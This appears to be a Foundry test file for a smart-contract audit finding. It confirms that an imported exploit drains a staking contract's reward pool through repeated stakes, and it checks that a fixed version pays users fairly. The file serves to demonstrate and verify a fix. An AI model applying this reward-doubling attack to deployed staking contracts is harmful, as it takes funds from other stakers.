// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    MyStakingFixed
} from "./57532-incorrect-storage-of-user-rewards-during-staking-in-mystakin.sol";

contract Finding57532Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_second_stake_doubles_rewards() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.attackerPaid(), 2000 ether, "attacker took the whole pool");
        assertEq(e.victimPaid(), 0, "victim got nothing");
        assertEq(e.stolen(), 1000 ether, "stolen half");
        assertEq(e.reward().balanceOf(SINK), 1000 ether, "sink");
    }

    function test_control_second_stake_does_not_double() public {
        MiniToken stakeToken = new MiniToken("Stake", "STK");
        MiniToken reward = new MiniToken("Reward", "RWD");
        MyStakingFixed staking = new MyStakingFixed(stakeToken, reward);
        FixedStaker victim = new FixedStaker();
        stakeToken.mint(address(this), 100 ether);
        stakeToken.mint(address(victim), 100 ether);
        stakeToken.approve(address(staking), type(uint256).max);
        staking.stake(100 ether);
        victim.stake(stakeToken, staking, 100 ether);
        reward.mint(address(this), 2000 ether);
        reward.approve(address(staking), type(uint256).max);
        staking.addReward(2000 ether);
        staking.stake(0);
        staking.stake(0);
        staking.claim();
        victim.claim(staking);
        assertEq(staking.paid(address(this)), 1000 ether, "attacker fair");
        assertEq(staking.paid(address(victim)), 1000 ether, "victim fair");
    }
}

contract FixedStaker {
    function stake(MiniToken token, MyStakingFixed staking, uint256 amount) external {
        token.approve(address(staking), type(uint256).max);
        staking.stake(amount);
    }

    function claim(MyStakingFixed staking) external {
        staking.claim();
    }
}
